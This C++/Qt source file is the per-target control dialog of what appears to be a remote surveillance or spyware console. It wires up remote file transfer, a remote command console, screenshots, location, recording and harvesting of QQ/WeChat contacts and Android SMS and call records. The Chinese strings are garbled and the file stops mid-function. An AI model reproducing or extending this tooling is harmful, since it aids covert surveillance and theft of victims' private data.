
#include "targetdlg.h"
#include "target.h"
#include "Utility.h"
#include "DatabaseManager.h"
#include "getdirinfodlg.h"
#include "TargetConnection.h"

#include "uploadfiledlg.h"
#include "downloaddirdlg.h"
#include "filemontypedlg.h"
#include "PicContainer.h"
#include "AppInfoDlg.h"
#include "thirdplugindlg.h"
#include "capturedlg.h"
#include "logdetaildlg.h"
#include "useractiondlg.h"
#include "multimediadlg.h"
#include "filectrldlg.h"
#include "remotecmddlg.h"
#include "advancemonitordlg.h"
#include "mapinfodlg.h"
#include "thirdplugindlg.h"
#include "exportappinfodlg.h"
#include "recorddlg.h"

#include "nofocusstyle.h"

#include "include/T5UsbConfig.h"
#include "include/T5Screen.h"

#include <shellapi.h>

#include <QFileIconProvider>

#include <activeqt/QAxObject.h>
#include <activeqt/QAxWidget.h>
#include <MsHTML.h>
#include <Mshtmhst.h>
#include <Exdisp.h>
#include <atlbase.h>

#include "skin.h"

#pragma comment(lib, "shell32.lib")

const wchar_t* TargetDlg::Net_description[] = {L"δ����", L"WIFI", L"3G", L"2G", L"4G"};

// ////////////////////////////////////////////////////////////////////////////////
// ���캯��
//
TargetDlg::TargetDlg(Target* target)
: QWidget(0)
, tarBlock(target)
, bShowFlag(false)
, bTaskManager(false)
, bAdvanceFileMonitor(false)
, bFileControl(false)
, bCmdConsole(false)
, bUserAction(false)
, bHttps(false)
, bLogInfo(false)
, bScreen(false)
, bMapInfo(false)
, bAppInfo(false)
, bThirdPlugin(false)
, bMultimedia(false)
, bRecord(false)
{
	ui.setupUi(this);

	// ���� https tab
	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("HTTPS��Ϣ")));

	// �����
	/*ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("��Ļ���")));
	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("��ͼ��λ")));
	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("Զ�̿���̨")));
	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("�߼��ļ����")));
	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("�ⲿ���")));*/

	if ( SYSTEM_WINDOWS != GetSystemType(this->tarBlock->dwOsBuildNumber) )
	{
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("Զ�̿���̨")));
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("����Ƶ���")));
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("�ⲿ���")));
	}

	if ( SYSTEM_ANDROID != GetSystemType(this->tarBlock->dwOsBuildNumber) )
	{
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("��ͼ��λ")));
	}

	if ( !MobileDevice(this->tarBlock) )
	{
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("��ʱͨѶȡ֤")));
	}
	else
	{
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("�߼��ļ����")));
	}

	/*if ( SYSTEM_IOS != this->tarBlock->m_sysType )
	{
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("��ʱͨѶȡ֤")));
	}*/

	//
	// �������
	//

	InitWidgetAppearance();

	InitLocalDataDirList();

	InitConnection();

	// �����
	ui.trMissionStatus->topLevelItem(4)->setHidden(true);
	if ( SYSTEM_WINDOWS == GetSystemType(this->tarBlock->dwOsBuildNumber) )
	{
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("�û���Ϊ���")));
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("����Ƶ���")));
	}
	if ( SYSTEM_MACOSX == GetSystemType(this->tarBlock->dwOsBuildNumber) )
	{
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("�߼��ļ����")));
	}

	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("��־��¼")));
	ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("�ļ�����")), QString::fromLocal8Bit("�ļ����"));
	ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("�û���Ϊ���")), QString::fromLocal8Bit("������Ϣ"));
	ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("��Ļ���")), QString::fromLocal8Bit("��Ļ��ͼ"));
	ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("��ʱͨѶȡ֤")), QString::fromLocal8Bit("�����¼"));

	ui.lbMissionStatus->hide();

	this->resize(900, this->height());
}

// ////////////////////////////////////////////////////////////////////////////////
// ��������
//
TargetDlg::~TargetDlg()
{
}

// ////////////////////////////////////////////////////////////////////////////////
// @public ���õ�ǰ tab ҳ
//
void TargetDlg::SetCurrentTab(QString name)
{
	int index = GetTabIndexFromName(name);
	ui.tabMain->setCurrentIndex(index);
	DispatchTabInit(index);
}

// ////////////////////////////////////////////////////////////////////////////////
// @public Ŀ������
//
void TargetDlg::TargetOnline()
{
	std::wstring title = 
		L"Ŀ�� " + 
		AnsiToWide(this->tarBlock->aniTargetName) + 
		L" { ID : " + 
		QString("%1").arg(this->tarBlock->dwTargetID).toStdWString() +
		L" }  [����]";

	this->setWindowTitle(QString::fromStdWString(title));

	// ���¶��š�ͨ����¼
	
	UpdatePhoneRecord();

	InitTaskList();

}

void TargetDlg::UpdatePhoneRecord()
{
	if ( SYSTEM_ANDROID != GetSystemType(this->tarBlock->dwOsBuildNumber) )
		return;

	//DM->ClearSMSInfo(this->m_tar->dwTargetID);
	//DM->ClearCALInfo(this->m_tar->dwTargetID);
	//DM->ClearCONTACTnfo(this->m_tar->dwTargetID);

	//RefreshSMSData();
	//RefreshCALData();
	//RefreshCONTACTData();

	std::wstring recordFile = PhoneRecordFile;

	if ( FrmMain->ctrConn )
	{
		FrmMain->ctrConn->Send_FDL(tarBlock->dwTargetID,
			GetBase64FromWide(recordFile).c_str());
	}

}

// ////////////////////////////////////////////////////////////////////////////////
// @public Ŀ������
//
void TargetDlg::TargetOffline()
{
	std::wstring title = 
		L"Ŀ�� " + 
		AnsiToWide(this->tarBlock->aniTargetName) + 
		L" { ID : " + 
		QString("%1").arg(this->tarBlock->dwTargetID).toStdWString() +
		L" }  [����]";

	setWindowTitle(QString::fromStdWString(title));

	//SendMessage(this->Handle, WM_REMOTERUN_FINISHED, NULL, NULL);

	// �����ƶ����ߵ�ʱ����Ҫ��������ļ����������б�
	// ��Ϊ�����ƶ�����������תʱ���������񶼻�����
	// ���ɣ�Ϊ�˱��������ظ�����Ҫ����վɵ�����
	//if ( !FrmMain->ctrOnlineFlag )
	//{
		// ��������ļ�����
		this->tarBlock->ClearAllFileTask();

		// ��������б�
		ui.tbUploadFileList->clearContents();
		ui.tbUploadFileList->setRowCount(0);
		ui.tbDownloadFileList->clearContents();
		ui.tbDownloadFileList->setRowCount(0);
		ui.tbDirCommand->clearContents();
		ui.tbDirCommand->setRowCount(0);
		ui.tbFileCommand->clearContents();
		ui.tbFileCommand->setRowCount(0);
		ui.tbPluginData->clearContents();
		ui.tbPluginData->setRowCount(0);
	//}
}

// ////////////////////////////////////////////////////////////////////////////////
// @protected ������ʾ֮ǰִ��һЩ����
//
void TargetDlg::showEvent(QShowEvent *e)
{
	if (this->bShowFlag == false)
	{
		if (this->tarBlock->tarStatus == TARONLINE)
		{
			if ( FrmMain )
				TargetOnline();
		}
		else
		{
			if ( FrmMain )
				TargetOffline();
		}

		this->bShowFlag = true;
	}

	QWidget::showEvent(e);
}

// ////////////////////////////////////////////////////////////////////////////////
// @protected �ӹ� windows ��Ϣ
//
bool TargetDlg::winEvent(MSG *msg, long *result)
{
	if ( msg->message >= WM_SET_TAR_STATUSINFO_W )
	{
		switch( msg->message )
		{

		case WM_SET_TAR_STATUSINFO_W:
			on_WM_SET_TAR_STATUSINFO_W(msg);
			break;

		case WM_NEW_FILETASK:
			on_WM_NEW_FILETASK(msg);
			break;

		case WM_UPT_FILETASK_STATUS:
			on_WM_UPT_FILETASK_STATUS(msg);
			break;

		case WM_UPT_FILETASK_PROGRESS:
			on_WM_UPT_FILETASK_PROGRESS(msg);
			break;

		case WM_NEW_DIRTASK:
			on_WM_NEW_DIRTASK(msg);
			break;

		case WM_UPT_DIRTASK_STATUS:
			on_WM_UPT_DIRTASK_STATUS(msg);
			break;

		case WM_UPT_DIRTASK_STATISTIC:
			on_WM_UPT_DIRTASK_STATISTIC(msg);
			break;

		case WM_NEW_SEARCHTASK:
			on_WM_NEW_SEARCHTASK(msg);
			break;

		case WM_UPT_SEARCHTASK_STATUS:
			on_WM_UPT_SEARCHTASK_STATUS(msg);
			break;

		case WM_FILETASK_FINISHED:
			on_WM_FILETASK_FINISHED(msg);
			break;

		case WM_UPDATE_USB_FILE:
			on_WM_UPDATE_USB_FILE(msg);
			break;

		case WM_UPDATE_USB_OP:
			on_WM_UPDATE_USB_OP(msg);
			break;

		case WM_UPDATE_HTTPS:
			on_WM_UPDATE_HTTPS(msg);
			break;

		case WM_UPDATE_SCREEN:
			on_WM_UPDATE_SCREEN(msg);
			break;

		case WM_UPDATE_LIRINFO:
			on_WM_UPDATE_LIRINFO(msg);
			break;

		case WM_UPDATE_DIRINFO:
			on_WM_UPDATE_DIRINFO(msg);
			break;

		case WM_UPDATE_SEARCHINFO:
			on_WM_UPDATE_SEARCHINFO(msg);
			break;

		case WM_REMOTERUN_REDIRECT:
			on_WM_REMOTERUN_REDIRECT(msg);
			break;

		case WM_REMOTERUN_OUTPUT:
			on_WM_REMOTERUN_OUTPUT(msg);
			break;

		case WM_REMOTERUN_FINISHED:
			on_WM_REMOTERUN_FINISHED(msg);
			break;

		case WM_ONLINESEARCH_FOUND_BLOCK:
			on_WM_ONLINESEARCH_FOUND_BLOCK(msg);
			break;

		case WM_ONLINESEARCH_FINISHED:
			on_WM_ONLINESEARCH_FINISHED(msg);
			break;

		case WM_ONLINESEARCH_ERRORED:
			on_WM_ONLINESEARCH_ERRORED(msg);
			break;

		case WM_CAPFULLSCREEN_FINISHED:
			on_WM_CAPFULLSCREEN_FINISHED(msg);
			break;

		case WM_FILEMONITOR_FINISHED:
			on_WM_FILEMONITOR_FINISHED(msg);
			break;

		case WM_FILEMONITOR_CHANGED:
			on_WM_FILEMONITOR_CHANGED(msg);
			break;

		case WM_NEW_LOCATION:
			on_WM_NEW_LOCATION(msg);
			break;

		case WM_NEW_SKYPE_RECORD:
			on_WM_NEW_SKYPE_RECORD(msg);
			break;

		case WM_NEW_PLUGIN_DATA:
			on_WM_NEW_PLUGIN_DATA(msg);
			break;

		case WM_NEW_THIRD_PLUGIN_FILE:
			on_WM_NEW_THIRD_PLUGIN_FILE(msg);
			break;

		case WM_NEW_BACKSOUND:
			on_WM_NEW_BACKSOUND(msg);
			break;

		case WM_BACKSOUND_SETTING:
			on_WM_BACKSOUND_SETTING(msg);

		case WM_APP_INFO_FINISHED:
			on_WM_APP_INFO_FINISHED(msg);
			break;

		case WM_APP_QQ_ACCOUNT:
			on_WM_APP_QQ_ACCOUNT(msg);
			break;

		case WM_APP_QQ_FRIEND:
			on_WM_APP_QQ_FRIEND(msg);
			break;

		case WM_APP_QQ_TROOP:
			on_WM_APP_QQ_TROOP(msg);
			break;

		case WM_APP_WEIXIN_ACCOUNT:
			on_WM_APP_WEIXIN_ACCOUNT(msg);
			break;

		case WM_APP_WEIXIN_FRIEND:
			on_WM_APP_WEIXIN_FRIEND(msg);
			break;
		}

		return true;
	}

	return false;
}


// ////////////////////////////////////////////////////////////////////////////////
// @private slot �ַ��� tab ҳ�ĳ�ʼ������
//
void TargetDlg::DispatchTabInit(int index)
{
	typedef void (__thiscall TargetDlg::*INIT_FUNC)(void);

	std::map<std::wstring, INIT_FUNC> initMap;

	initMap[L"�ļ����"] = &TargetDlg::InitFileCtrl;
	initMap[L"Զ�̿���̨"] = &TargetDlg::InitRemoteCmd;
	initMap[L"����״̬"] = &TargetDlg::InitTaskStatus;
	initMap[L"������Ϣ"] = &TargetDlg::InitUserActionMonitor;
	initMap[L"�߼��ļ����"] = &TargetDlg::InitAdvanceFileMonitor;
	initMap[L"��Ļ��ͼ"] = &TargetDlg::InitScreenshot;
	initMap[L"����Ƶ���"] = &TargetDlg::InitMultimedia;
	initMap[L"��־��¼"] = &TargetDlg::InitLogInfo;
	initMap[L"��ͼ��λ"] = &TargetDlg::InitMapInfo;
	initMap[L"�����¼"] = &TargetDlg::InitAppInfo;
	initMap[L"�ⲿ���"] = &TargetDlg::InitThirdPlugin;
	initMap[L"¼����Ϣ"] = &TargetDlg::InitRecordInfo;

	std::wstring title = ui.tabMain->tabText(index).toStdWString();
	INIT_FUNC func = initMap[title];

	if ( func != NULL )
	{
		(this->*func)();
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ���뱾������Ŀ¼
//
void TargetDlg::onCmbLocalDirIndexChanged(int index)
{
	switch(index)
	{
	case 0:
		ShellExecuteW(NULL, L"explore", this->tarBlock->widLocalDataDir.c_str(), NULL, NULL, SW_SHOW);
		break;

	case 1:
		ShellExecuteW(NULL, L"explore", this->tarBlock->widDiskDataDir.c_str(), NULL, NULL, SW_SHOW);
		break;

	case 2:
		ShellExecuteW(NULL, L"explore", this->tarBlock->widUsbDataDir.c_str(), NULL, NULL, SW_SHOW);
		break;

	case 3:
		ShellExecuteW(NULL, L"explore", this->tarBlock->widDelDataDir.c_str(), NULL, NULL, SW_SHOW);
		break;

	case 4:
		ShellExecuteW(NULL, L"explore", this->tarBlock->widDirPath.c_str(), NULL, NULL, SW_SHOW);
		break;

	case 5:
		ShellExecuteW(NULL, L"explore", this->tarBlock->widHttpsDataDir.c_str(), NULL, NULL, SW_SHOW);
		break;

	case 6:
		ShellExecuteW(NULL, L"explore", this->tarBlock->wideScreenPath.c_str(), NULL, NULL, SW_SHOW);
		break;

	case 7:
		ShellExecuteW(NULL, L"explore", this->tarBlock->widMultimediaPath.c_str(), NULL, NULL, SW_SHOW);
		break;

	case 8:
		ShellExecuteW(NULL, L"explore", this->tarBlock->wid3rdFilePath.c_str(), NULL, NULL, SW_SHOW);
		break;
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ѡ���ļ�����ָ��
//
void TargetDlg::onTrMissionStatusItemClicked(QTreeWidgetItem* item, int column)
{
	//if ( NULL != item->parent() )
	//{
		ui.stkMissionStatus->setCurrentIndex(ui.trMissionStatus->indexOfTopLevelItem(item));
	//	ui.lbMissionStatus->setText(item->parent()->text(0));
	//}
	//else
	//{
	//	ui.lbMissionStatus->setText(item->text(0));
	//}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ��� ���� ��ť
//
void TargetDlg::onBtnCountinueClicked()
{
	if (FrmMain->ctrOnlineFlag == false)
	{
		MsgBoxErrorW(this->Handle, L"[�ѻ����ݲ鿴ģʽ]���ܶ��ļ�������в���!");
		return;
	}

	// ��ȡ��ǰ�����б�
	QTableWidget* table = GetActiveFTListView();
	if ( NULL == table )
	{
		MsgBoxErrorW(this->Handle, L"����ѡ��һ������");
		return;
	}

	QList<QTableWidgetItem*> itemList = table->selectedItems();

	if ( 0 == itemList.count() )
	{
		MsgBoxErrorW(this->Handle, L"����ѡ��һ������");
		return;
	}

	QTableWidgetItem* item = itemList.at(0);
	QTableWidgetItem* curItem = table->item(item->row(), 0);

	if ( 0 == curItem->data(Qt::UserRole).toUInt() )
	{
		MsgBoxErrorW(this->Handle, L"���ܼ���������");
		return;
	}

	DWORD taskStatus;
	DWORD targetID;
	DWORD taskID;
	DWORD taskType;

	if (table == ui.tbDirCommand || table == ui.tbDirInfoList )
	{
		DirTask *dirTask = (DirTask *)curItem->data(Qt::UserRole).toUInt();
		taskStatus = dirTask->taskStatus;
		targetID = dirTask->dwTargetID;
		taskID = dirTask->dwTaskID;
		taskType = TASK_DIR;
	}   
	else
	{
		FileTask *fileTask = (FileTask *)curItem->data(Qt::UserRole).toUInt();
		taskStatus = fileTask->taskStatus;
		targetID = fileTask->dwTargetID;
		taskID = fileTask->dwTaskID;
		taskType = fileTask->taskType;
	}

	if ((WORKING == taskStatus) || (PAUSED  == taskStatus))
	{
		if (WORKING == taskStatus) 
		{
			SetTarStatusInfoExW(STATUS_INFO, this->tarBlock, L"���� ( ID : %d ) ����ִ�� ...", taskID);
			return;
		}

		if (this->tarBlock->tarConn)
		{
			SetTarStatusInfoExW(STATUS_INFO, this->tarBlock, L"�ָ����� ( ID : %d )", taskID);
			this->tarBlock->tarConn->Send_RFT(targetID, taskID, taskType);
		}
	}
	else
	{
		SetTarStatusInfoExW(STATUS_INFO, this->tarBlock, L"���ܶ����� ( ID : %d ) ���лָ�����", taskID);
		WCHAR info[MAX_PATH] = {0};
		wsprintf(info, L"���ܶ����� ( ID : %d ) ���лָ�����", taskID);
		MsgBoxErrorW(this->Handle, info);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ��ͣ
//
void TargetDlg::onBtnPauseClicked()
{
	if (FrmMain->ctrOnlineFlag == false)
	{
		MsgBoxErrorW(this->Handle, L"[�ѻ����ݲ鿴ģʽ]���ܶ��ļ�������в���!");
		return;
	}

	// ��ȡ��ǰ�����б�
	QTableWidget* table = GetActiveFTListView();
	if ( NULL == table )
	{
		MsgBoxErrorW(this->Handle, L"����ѡ��һ������");
		return;
	}

	QList<QTableWidgetItem*> itemList = table->selectedItems();

	if ( 0 == itemList.count() )
	{
		MsgBoxErrorW(this->Handle, L"����ѡ��һ������");
		return;
	}

	QTableWidgetItem* item = itemList.at(0);
	QTableWidgetItem* curItem = table->item(item->row(), 0);

	if ( 0 == curItem->data(Qt::UserRole).toUInt() )
	{
		MsgBoxErrorW(this->Handle, L"������ͣ������");
		return;
	}

	DWORD taskStatus;
	DWORD targetID;
	DWORD taskID;
	DWORD taskType;

	if (table == ui.tbDirCommand || table == ui.tbDirInfoList )
	{
		DirTask *dirTask = (DirTask *)curItem->data(Qt::UserRole).toUInt();
		taskStatus = dirTask->taskStatus;
		targetID = dirTask->dwTargetID;
		taskID = dirTask->dwTaskID;
		taskType = TASK_DIR;
	}   
	else
	{
		FileTask *fileTask = (FileTask *)curItem->data(Qt::UserRole).toUInt();
		taskStatus = fileTask->taskStatus;
		targetID = fileTask->dwTargetID;
		taskID = fileTask->dwTaskID;
		taskType = fileTask->taskType;
	}

	if ((WORKING == taskStatus) || (PAUSED  == taskStatus))
	{
		if ( PAUSED  == taskStatus )
		{
			SetTarStatusInfoExW(STATUS_INFO, this->tarBlock, L"���� ( ID : %d ) �Ѿ�������ͣ״̬!", taskID);
			return;
		}

		if (this->tarBlock->tarConn)
		{
			SetTarStatusInfoExW(STATUS_INFO, this->tarBlock, L"��ͣ���� ( ID : %d )", taskID);
			this->tarBlock->tarConn->Send_PFT(targetID, taskID, taskType);
		}
	}
	else
	{
		SetTarStatusInfoExW(STATUS_INFO, this->tarBlock, L"���ܶ����� ( ID : %d ) ������ͣ����", taskID);
		WCHAR info[MAX_PATH] = {0};
		wsprintf(info, L"���ܶ����� ( ID : %d ) ������ͣ����", taskID);
		MsgBoxErrorW(this->Handle, info);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ȡ��
//
void TargetDlg::onBtnCancelClicked()
{
	if (FrmMain->ctrOnlineFlag == false)
	{
		MsgBoxErrorW(this->Handle, L"[�ѻ����ݲ鿴ģʽ]���ܶ��ļ�������в���!");
		return;
	}

	// ��ȡ��ǰ�����б�
	QTableWidget* table = GetActiveFTListView();
	if ( NULL == table )
	{
		MsgBoxErrorW(this->Handle, L"����ѡ��һ������");
		return;
	}

	QList<QTableWidgetItem*> itemList = table->selectedItems();

	if ( 0 == itemList.count() )
	{
		MsgBoxErrorW(this->Handle, L"����ѡ��һ������");
		return;
	}

	QTableWidgetItem* item = itemList.at(0);
	QTableWidgetItem* curItem = table->item(item->row(), 0);

	if ( 0 == curItem->data(Qt::UserRole).toUInt() )
	{
		MsgBoxErrorW(this->Handle, L"����ȡ��������");
		return;
	}

	DWORD taskStatus;
	DWORD targetID;
	DWORD taskID;
	DWORD taskType;

	if (table == ui.tbDirCommand || table == ui.tbDirInfoList )
	{
		DirTask *dirTask = (DirTask *)curItem->data(Qt::UserRole).toUInt();
		taskStatus = dirTask->taskStatus;
		targetID = dirTask->dwTargetID;
		taskID = dirTask->dwTaskID;
		taskType = TASK_DIR;
	}   
	else
	{
		FileTask *fileTask = (FileTask *)curItem->data(Qt::UserRole).toUInt();
		taskStatus = fileTask->taskStatus;
		targetID = fileTask->dwTargetID;
		taskID = fileTask->dwTaskID;
		taskType = fileTask->taskType;
	}

	if ((WORKING == taskStatus) || (PAUSED  == taskStatus))
	{
		if (this->tarBlock->tarConn)
		{
			SetTarStatusInfoExW(STATUS_INFO, this->tarBlock, L"ȡ������ ( ID : %d )", taskID);
			this->tarBlock->tarConn->Send_CFT(targetID, taskID, taskType);
		}
	}
	else
	{
		SetTarStatusInfoExW(STATUS_INFO, this->tarBlock, L"���ܶ����� ( ID : %d ) ����ȡ������", taskID);
		WCHAR info[MAX_PATH] = {0};
		wsprintf(info, L"���ܶ����� ( ID : %d ) ����ȡ������", taskID);
		MsgBoxErrorW(this->Handle, info);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ���Ŀ¼�����б��е� item
//
void TargetDlg::onDirDownloadItemClicked(QTableWidgetItem* item)
{
	ui.tbFileCommand->clearContents();
	ui.tbFileCommand->setRowCount(0);
	item = ui.tbDirCommand->item(item->row(), 0);
	DirTask *lpDirTask = (DirTask *)item->data(Qt::UserRole).toUInt();

	if ( FINISHED == lpDirTask->taskStatus )
	{
		DM->QueryDirDownDetail(this->tarBlock->dwTargetID, lpDirTask->dwTaskID, ui.tbFileCommand);
		return;
	}

	if ( lpDirTask )
	{
		DWORD   dwDirTaskID = lpDirTask->dwTaskID;

		std::map<ULONG , FileTask *>::iterator j = tarBlock->fileTaskMap.begin();
		for (; j != tarBlock->fileTaskMap.end(); j++)
		{
			FileTask *fileTask = (*j).second;
			if (fileTask->dwParentID == dwDirTaskID)
			{
				AddFileTaskToListView(fileTask);
			}
		}
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �������΢��
//
void TargetDlg::InitWidgetAppearance()
{
	NoFocusStyle* nofocusStyle = new NoFocusStyle(this);

	ui.tabMain->setStyleSheet(GetStylesheetFromFile(L"tab"));

	//
	// ����״̬
	//
	ui.trMissionStatus->setStyle(nofocusStyle);
	ui.trMissionStatus->topLevelItem(0)->setExpanded(true);

	// Ŀ¼�����б�
	ui.tbDirCommand->setStyle(nofocusStyle);
	ui.tbDirCommand->horizontalHeader()->resizeSection(2, 150);
	ui.tbDirCommand->horizontalHeader()->resizeSection(3, 100);
	ui.tbDirCommand->horizontalHeader()->resizeSection(4, 50);
	ui.tbDirCommand->horizontalHeader()->resizeSection(5, 50);
	ui.tbDirCommand->horizontalHeader()->resizeSection(6, 50);
	ui.tbDirCommand->horizontalHeader()->resizeSection(7, 50);
	ui.tbDirCommand->horizontalHeader()->resizeSection(8, 50);

	ui.tbUploadFileList->setStyle(nofocusStyle);
	ui.tbDownloadFileList->setStyle(nofocusStyle);
	ui.tbFileCommand->setStyle(nofocusStyle);
	ui.tbDirInfoList->setStyle(nofocusStyle);
	ui.tbUploadPluginList->setStyle(nofocusStyle);
	ui.tbPluginData->setStyle(nofocusStyle);
	ui.cmbLocalDir->setStyle(nofocusStyle);

	ui.tabMain->setStyleSheet("QTabBar::tab{max-height:0px;}");
	ui.frame_4->hide();
	setStyleSheet("");
	ui.tabMain->setTabPosition(QTabWidget::South);

	const wchar_t* labels[] = {L"����״̬", L"�ļ����", L"������Ϣ", L"��Ļ��ͼ", L"¼����Ϣ", L"�����¼", L"��ͼ��λ"};

	QVBoxLayout* layout = new QVBoxLayout;
	layout->setContentsMargins(0, 0, 0, 0);
	layout->setSpacing(0);

	ui.frame_tool_bar->setStyleSheet("QFrame#frame_tool_bar{background-color:rgb(247, 249, 255);}");

	for ( int i = 0; i < sizeof(labels) / sizeof ( const wchar_t* ); ++i )
	{
		QRadioButton* btn = new QRadioButton;
		btn->setText(QString::fromStdWString(std::wstring(labels[i])));

		btn->setStyleSheet(
			"QRadioButton::indicator{width:0px;height:0px;}"
			"QRadioButton{background-color:rgb(247, 249, 255);border:0px solid #cccccc;border-bottom-width:1px;min-width:120px;min-height:35px;font-family:'Microsoft Yahei';font-size:12px;color:black;padding-left:20px;}"
			"QRadioButton:hover{background-color:rgb(209, 216, 240);color:black;}"
			"QRadioButton:checked{background-color:rgb(133, 153, 216);color:white;}");

		if ( 0 == i ) btn->setChecked(true);
		
		connect(btn, SIGNAL(clicked()), this, SLOT(onToolBarButtonClicked()));
		layout->addWidget(btn);
	}

	layout->addSpacerItem(new QSpacerItem(10, 50, QSizePolicy::Fixed, QSizePolicy::Expanding));

	ui.frame_tool_bar->setLayout(layout);
}

void TargetDlg::onToolBarButtonClicked()
{
	QRadioButton* btn = qobject_cast<QRadioButton*>(sender());

	int index = GetTabIndexFromName(btn->text());
	ui.tabMain->setCurrentIndex(index);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �� tab ���õ� index
//
int TargetDlg::GetTabIndexFromName(QString name)
{
	for (int i = 0; i < ui.tabMain->count(); i++ )
	{
		if ( name == ui.tabMain->tabText(i) )
		{
			return i;
		}
	}

	return -1;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ʼ�� signal & slot
//
void TargetDlg::InitConnection()
{

	// tab ҳ�л�
	connect(ui.tabMain, SIGNAL(currentChanged(int)), this, SLOT(DispatchTabInit(int)));

	// ���뱾������Ŀ¼
	connect(ui.cmbLocalDir, SIGNAL(activated(int)), this, SLOT(onCmbLocalDirIndexChanged(int)));


	//////////////////////////////////////////
	// ����״̬

	// ����б�
	connect(ui.trMissionStatus, SIGNAL(itemClicked(QTreeWidgetItem*, int)), 
		this, SLOT(onTrMissionStatusItemClicked(QTreeWidgetItem*, int)));

	// ���Ŀ¼�����б��е� item
	connect(ui.tbDirCommand, SIGNAL(itemClicked(QTableWidgetItem*)), this, SLOT(onDirDownloadItemClicked(QTableWidgetItem*)));

	// ��������ͣ��ȡ��
	connect(ui.btnContinue, SIGNAL(clicked()), this, SLOT(onBtnCountinueClicked()));
	connect(ui.btnPause, SIGNAL(clicked()), this, SLOT(onBtnPauseClicked()));
	connect(ui.btnCancel, SIGNAL(clicked()), this, SLOT(onBtnCancelClicked()));
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ʼ����������Ŀ¼�б�
//
void TargetDlg::InitLocalDataDirList()
{
	ui.cmbLocalDir->clear();

	ui.cmbLocalDir->addItem(
		QIcon(QPixmap(":/image/dirfilelist.png")), 
		QString::fromLocal8Bit("������뱾������Ŀ¼"));

	ui.cmbLocalDir->addItem(
		QIcon(QPixmap(":/image/dirfilelist.png")), 
		QString::fromLocal8Bit("�����ļ�����Ŀ¼"));

	ui.cmbLocalDir->addItem(
		QIcon(QPixmap(":/image/dirfilelist.png")), 
		QString::fromLocal8Bit("USB ���ļ�����Ŀ¼"));

	ui.cmbLocalDir->addItem(
		QIcon(QPixmap(":/image/dirfilelist.png")), 
		QString::fromLocal8Bit("ɾ���ļ�����Ŀ¼"));

	ui.cmbLocalDir->addItem(
		QIcon(QPixmap(":/image/dirfilelist.png")), 
		QString::fromLocal8Bit("Ŀ¼�䶯����Ŀ¼"));

	ui.cmbLocalDir->addItem(
		QIcon(QPixmap(":/image/dirfilelist.png")), 
		QString::fromLocal8Bit("HTTPS ����Ŀ¼"));

	ui.cmbLocalDir->addItem(
		QIcon(QPixmap(":/image/dirfilelist.png")), 
		QString::fromLocal8Bit("��Ļ����ļ�Ŀ¼"));

	ui.cmbLocalDir->addItem(
		QIcon(QPixmap(":/image/dirfilelist.png")), 
		QString::fromLocal8Bit("����Ƶ����ļ�Ŀ¼"));

	ui.cmbLocalDir->addItem(
		QIcon(QPixmap(":/image/dirfilelist.png")), 
		QString::fromLocal8Bit("�������������Ŀ¼"));
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ʼ���ļ�����
//
void TargetDlg::InitFileCtrl()
{
	if (this->bFileControl == false)
	{
		m_fileCtrlDlg = new FileCtrlDlg(ui.frmFileCtrl, this->tarBlock);
		InitCustomText(m_fileCtrlDlg);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmFileCtrl);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_fileCtrlDlg);
		//onRefreshMonitorDirInfoTriggered();

		this->bFileControl = true;
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ʼ������̨
//
void TargetDlg::InitRemoteCmd()
{
	if ( !bCmdConsole )
	{
		m_remoteCmdDlg = new RemoteCmdDlg(ui.frmRemoteCmd, this->tarBlock);
		InitCustomText(m_remoteCmdDlg);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmRemoteCmd);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_remoteCmdDlg);
		bCmdConsole = true;
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ʼ������״̬
//
void TargetDlg::InitTaskStatus()
{
	if (this->bTaskManager == false)
	{
		// ��һ�ε���첽ָ��ϵͳʱ�����г�ʼ��ʾ
		//

		//if (FrmMain->ctrOnlineFlag)
		//{
		//	ConvertToOnlineTask();
		//}
		//else
		//{
		//	ConvertToHistoryTask();
		//}

		//
		// ��ʼ��������ݻش��б�
		//
		InitCustomText(this);

		this->bTaskManager = true;
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ʼ����Ļ��ͼ
//
void TargetDlg::InitScreenshot()
{
	if ( !this->bScreen )
	{
